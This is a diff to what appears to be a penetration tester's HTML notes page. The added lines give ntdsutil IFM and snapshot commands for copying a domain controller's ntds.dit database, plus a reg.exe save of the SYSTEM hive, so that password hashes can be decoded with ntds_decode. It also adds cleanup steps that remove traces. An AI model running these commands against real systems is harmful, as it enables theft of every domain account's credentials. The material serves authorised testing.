@@ -7,9 +7,31 @@
 <br/>
 C:\&gt;ntdsutil<br/>
 ntdsutil: activate instance ntds<br/>
+ntdsutil: list all &#09;&#09;&#09;&#09;#if there is already a snapshot, maybe use that instead<br/>
 ntdsutil: ifm<br/>
 ifm: create full c:\pentest<br/>
 ifm: quit<br/>
 ntdsutil: quit<br/>
+<br/>
+Then you can use <a href="https://github.com/mubix/ntds_decode">ntds_decode</a>&nbsp;to read it<br/>
+<br/>
+<br/>
+NTDSUTIL without IFM<br/>
+ntdsutil: snapshot<br/>
+snapshot: activate instance ntds<br/>
+snapshot: list all &#09;&#09;&#09;&#09;#if there is already a snapshot, maybe use that instead<br/>
+snapshot: create<br/>
+snapshot: list all<br/>
+snapshot: mount &lt;#&gt;<br/>
+<br/>
+Now download the ntds.dit file from C:\$SNAP_201310241833_VOLUMEC$\Windows\NTDS\ and also get a copy of the SYSTEM registry hive (eg. reg.exe save HKLM\SYSTEM c:\system.save).<br/>
+<br/>
+Cleanup when done. Delete the copy of the system hive, and remove the snapshot:<br/>
+snapshot: unmount &lt;#&gt;<br/>
+snapshot: list all<br/>
+snapshot: delete &lt;#&gt;<br/>
+ntdsutil: quit<br/>
+<br/>
+Restore the VSS service back to its original state (ie. stop the service if it wasn’t running before, disable the service if you had to enable it etc.).<br/>
 <br/>
 Then you can use <a href="https://github.com/mubix/ntds_decode">ntds_decode</a>&nbsp;to read it</body></html>
